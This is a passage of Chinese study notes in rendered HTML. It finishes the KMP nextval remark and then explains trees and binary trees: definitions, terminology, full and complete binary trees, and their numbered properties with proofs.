<p>如果出现了，则需要再次递归，将 <code>next[j]</code> 修正为 <code>next[next[j]]</code>，直至两者不相等为止，更新后的数组命名为 <code>nextval</code>。计算 next 数组修正值的算法如下，此时匹配算法不变。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 树与二叉树</h2>
<h3> 树的基本概念</h3>
<h4> 树的定义</h4>
<p>树是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⩾</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n(n \geqslant 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 个结点的有限集。当 <code>n = 0</code> 时，称为空树。在任意一棵非空树中应满足：</p>
<ul>
<li>有且仅有一个特定的称为根的结点</li>
<li>当 <code>n &gt; 1</code> 时，其余结点可分为 <code>m(m &gt; 0)</code>个互不相交的有限集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>T</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><msub><mi>T</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">T_{1}, T_{2}, \dotsc T_{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，其中每个集合本身又是一棵树，并且称为根的子树</li>
</ul>
<p>显然，树的定义是递归的，即在树的定义中又用到了其自身，树是一种递归的数据结构。树作为一种逻辑结构，同时也是一种分层结构，具有以下两个特点：</p>
<ul>
<li>树的根结点没有前驱，除根结点外的所有结点有且只有一个前驱</li>
<li>树中所有结点都可以有零个或多个后继</li>
</ul>
<p>树适合于表示具有层次结构的数据。树中的某个结点（除根结点外）最多只和上一层的一个结点（即其父结点）有直接关系，根结点没有直接上层结点，因此在 <code>n</code> 个结点的树中有 <code>n - 1</code> 条边。而树中每个结点与其下一层的零个或多个结点（即其子女结点）都有直接关系。</p>
<h4> 基本术语</h4>
<figure><figcaption>树的树形表示</figcaption></figure>
<ol>
<li>
<p>考虑结点 K。根 A 到结点 K 的唯一路径上的任意结点，称为结点 K 的 <strong>祖先</strong>。如：结点 B 是结点 K 的祖先，而结点 K 是结点 B 的 <strong>子孙</strong>。路径上最接近结点 K 的结点 E 称为 K 的 <strong>双亲</strong>，而 K 为结点 E 的 <strong>孩子</strong>。根 A 是树中唯一没有双亲的结点。有相同双亲的结点称为 <strong>兄弟</strong>，如：结点 K 和结点 L 有相同的双亲 E，即 K 和 L 为 <strong>兄弟</strong></p>
</li>
<li>
<p>树中一个结点的孩子个数称为该结点的 <strong>度</strong>，树中结点的最大度数称为树的度。如：结点 B 的度为 <code>2</code>，结点 D 的度为 <code>3</code>，树的度为 <code>3</code></p>
</li>
<li>
<p>度大于 0 的结点称为 <strong>分支结点</strong>（又称非终端结点）；度为 0（没有子女结点）的结点称为 <strong>叶结点</strong>（又称终端结点）。在分支结点中，每个结点的分支数就是该结点的度</p>
</li>
<li>
<p>结点的深度、高度和层次</p>
<p>结点的层次从树根开始定义，根结点为第 1 层，它的子结点为第 2 层，以此类推。双亲在同一层的结点互为堂兄弟，上图中结点 G 与 E、F、H、I、J 互为堂兄弟。</p>
<ul>
<li><strong>结点的深度</strong>：是从根结点开始自顶向下逐层累加的</li>
<li><strong>结点的高度</strong>：是从叶结点开始自底向上逐层累加的</li>
<li><strong>树的高度（或深度）</strong>：是树中结点的最大层数。上图中树的高度为 <code>4</code></li>
</ul>
</li>
<li>
<p>有序树和无序树。树中结点的各子树从左到右是有次序的，不能互换，称该树为有序树，否则称为无序树。假设上图为有序树，若将子结点位置互换，则变成一棵不同的树</p>
</li>
<li>
<p>路径和路径长度。树中两个结点之间的路径是由这两个结点之间所经过的结点序列构成的，而路径长度是路径上所经过的边的个数</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>由于树中的分支是有向的，即从双亲指向孩子，所以树中的路径是从上向下的，同一双亲的两个孩子之间不存在路径</p>
</div>
</li>
<li>
<p>森林。森林是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mo>⩾</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m(m \geqslant 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 棵互不相交的树的集合。森林的概念与树的概念十分相近，因为只要把树的根结点删去就成了森林。反之，只要给 <code>m</code> 棵独立的树加上一个结点，并把这 <code>m</code> 棵树作为该结点的子树，则森林就变成了树</p>
</li>
</ol>
<h4> 树的性质</h4>
<p>树具有如下最基本的性质：</p>
<ul>
<li>树中的结点数等于所有结点的度数之和加 <code>1</code></li>
<li>度为 <code>m</code> 的树中第 <code>i</code> 层上至多有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m^{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 个结点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>⩾</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i \geqslant 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li>高度为 <code>h</code> 的 <code>m</code> 叉树至多有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>m</mi><mi>h</mi></msup><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m^{h} - 1) / (m - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 个结点</li>
<li>具有 <code>n</code> 个结点的 <code>m</code> 叉树的最小高度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_{m} (n(m - 1) + 1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)⌉</span></span></span></span></li>
</ul>
<h3> 二叉树的概念</h3>
<h4> 二叉树的定义及其主要特性</h4>
<ol>
<li>
<p><strong>二叉树的定义</strong></p>
<p>二叉树是一种特殊的树形结构，其特点是每个结点至多只有两棵子树（即二叉树中不存在度大于 <code>2</code> 的结点），并且二叉树的子树有左右之分，其次序不能任意颠倒。</p>
<p>与树相似，二叉树也以递归的形式定义。二叉树是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⩾</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n(n \geqslant 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 个结点的有限集合：</p>
<ul>
<li>或者为空二叉树，即 <code>n = 0</code></li>
<li>或者由一个根结点和两个互不相交的被称为根的左子树和右子树组成。左子树和右子树又分别是一棵二叉树</li>
</ul>
<p>二叉树是有序树，若将其左、右子树颠倒，则成为另一棵不同的二叉树。即使树中结点只有一棵子树，也要区分它是左子树还是右子树。二叉树的五种基本形态：空二叉树、只有根结点、只有左子树、只有右子树、左右子树都有。</p>
<p>二叉树与度为 <code>2</code> 的有序树的区别：</p>
<ul>
<li>度为 <code>2</code> 的树至少有 <code>3</code> 个结点，而二叉树可以为空</li>
<li>度为 <code>2</code> 的有序树的孩子的左右次序是相对于另一孩子而言的，若某个结点只有一个孩子，则这个孩子就无须区分其左右次序，而二叉树无论其孩子数是否为 <code>2</code>，均需确定其左右次序，即二叉树的结点次序不是相对于另一结点而言的，而是确定的</li>
</ul>
</li>
<li>
<p><strong>几个特殊的二叉树</strong></p>
<ul>
<li>
<p><strong>满二叉树</strong></p>
<p>一棵高度为 <code>h</code>，且含有 2<sup>h</sup> - 1 个结点的二叉树称为 <strong>满二叉树</strong>，即树中的每层都含有最多的结点。满二叉树的叶结点都集中在二叉树的最下一层，并且除叶结点之外的每个结点度数均为 <code>2</code>。</p>
<p>可以对满二叉树按层序编号：约定编号从根结点（根结点编号为 <code>1</code>）起，自上而下，自左向右。这样，每个结点对应一个编号，对于编号为 <code>i</code> 的结点，若有双亲，则其双亲为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>i</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor i / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">i</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span>，若有左孩子，则左孩子为 <code>2i</code>；若有右孩子，则右孩子为 <code>2i + 1</code>。</p>
</li>
<li>
<p><strong>完全二叉树</strong></p>
<p>高度为 <code>h</code>、有 <code>n</code> 个结点的二叉树，当且仅当其每个结点都与高度为 <code>h</code> 的满二叉树中编号为 <code>1~n</code> 的结点一一对应时，称为 <strong>完全二叉树</strong>。其特点如下：</p>
<ul>
<li>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>⩽</mo><mo stretchy="false">⌊</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">i \leqslant \lfloor n / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7962em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span>，则结点 <code>i</code> 为分支结点，否则为叶结点</li>
<li>叶结点只可能在层次最大的两层上出现。对于最大层次中的叶结点，都依次排列在该层最左边的位置上</li>
<li>若有度为 <code>1</code> 的结点，则只可能有一个，且该结点只有左孩子而无右孩子（重要特征）</li>
<li>按层序编号后，一旦出现某结点（编号为 <code>i</code>）为叶结点或只有左孩子，则编号大于 <code>i</code> 的结点均为叶结点</li>
<li>若 <code>n</code> 为奇数，则每个分支结点都有左孩子和右孩子；若 <code>n</code> 为偶数，则编号最大的分支结点（编号为 <code>n/2</code>）只有左孩子，没有右孩子，其余分支结点左、右孩子都有</li>
</ul>
</li>
<li>
<p><strong>二叉排序树</strong></p>
<p>左子树上所有结点的关键字均小于根结点的关键字；右子树上的所有结点的关键字均大于根结点的关键字；左子树和右子树又各是一棵二叉排序树。</p>
</li>
<li>
<p><strong>平衡二叉树</strong></p>
<p>树上任意一个结点的左子树和右子树的深度之差不超过 <code>1</code></p>
</li>
</ul>
</li>
<li>
<p><strong>二叉树的性质</strong></p>
<ol>
<li>
<p>非空二叉树上的叶结点数等于度为 <code>2</code> 的结点数加 <code>1</code>，即 n<sub>0</sub> = n<sub>2</sub> + 1</p>
<p>证明：设度为 0, 1 和 2 的结点个数分别为 n<sub>0</sub>, n<sub>1</sub> 和 n<sub>2</sub>，结点总数 n = n<sub>0</sub> + n<sub>1</sub> + n<sub>2</sub>。</p>
<p>看二叉树中的分支数，除根结点外，其余结点都有一个分支进入，设 <code>B</code> 为分支总数，则 n = B + 1。由于这些分支是由度为 <code>1</code> 或 <code>2</code> 的结点射出的，所以又有 B = n<sub>1</sub> + 2n<sub>2</sub>。于是得 n<sub>0</sub> + n<sub>1</sub> + n<sub>2</sub> = n<sub>1</sub> + 2n<sub>2</sub> + 1，则 n<sub>0</sub> = n<sub>2</sub> + 1。</p>
</li>
<li>
<p>非空二叉树上第 K 层上至多有 2<sup>k-1</sup> 个结点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>⩾</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">k \geqslant 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p>
<p>第 1 层至多有 2<sup>1-1</sup> = 1 个结点（根），第 2 层至多有 2<sup>2-1</sup> = 2个结点，以此类推，可以证明其为一个公比为 <code>2</code> 的等比数列 2<sup>k-1</sup>。</p>
</li>
<li>
<p>高度为 <code>h</code> 的二叉树至多有 2<sup>h</sup> - 1 个结点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>⩾</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h \geqslant 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p>
<p>该性质利用性质 <code>2</code> 求前 <code>h</code> 项的和，即等比数列求和的结果。</p>
</li>
<li>
<p>对完全二叉树按从上到下、从左到右的顺序依次编号 <code>1, 2, ..., n</code>，则有以下关系：</p>
<ul>
<li>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i &gt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时，结点 <code>i</code> 的双亲的编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>i</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor i / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">i</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span>，即当 <code>i</code> 为偶数时，其双亲的编号为 <code>i/2</code>，它是双亲的左孩子；当 <code>i</code> 为奇数时，其双亲的编号为 <code>(i - 1)/2</code>，它是双亲的右孩子</li>
<li>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>i</mi><mo>⩽</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">2i \leqslant n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7962em;vertical-align:-0.1367em;"></span><span class="mord">2</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 时，结点 <code>i</code> 的左孩子编号为 <code>2i</code>，否则无左孩子</li>
<li>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn><mo>⩽</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">2i + 1 \leqslant n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 时，结点 <code>i</code> 的右孩子编号为 <code>2i + 1</code>，否则无右孩子</li>
<li>结点 <code>i</code> 所在层次（深度）为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>i</mi><mo stretchy="false">⌋</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lfloor log_{2}i \rfloor + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></li>
</ul>
</li>
<li>
<p>具有 <code>n</code> 个（n &gt; 0）结点的完全二叉树的高度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_{2}(n + 1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)⌉</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">⌋</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lfloor log_{2}n \rfloor + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p>
<p>设高度为 <code>h</code>，根据性质 <code>3</code> 和完全二叉树的定义有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>n</mi><mo>⩽</mo><msup><mn>2</mn><mi>h</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{h-1} - 1 &lt; n \leqslant 2^{h} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9324em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span 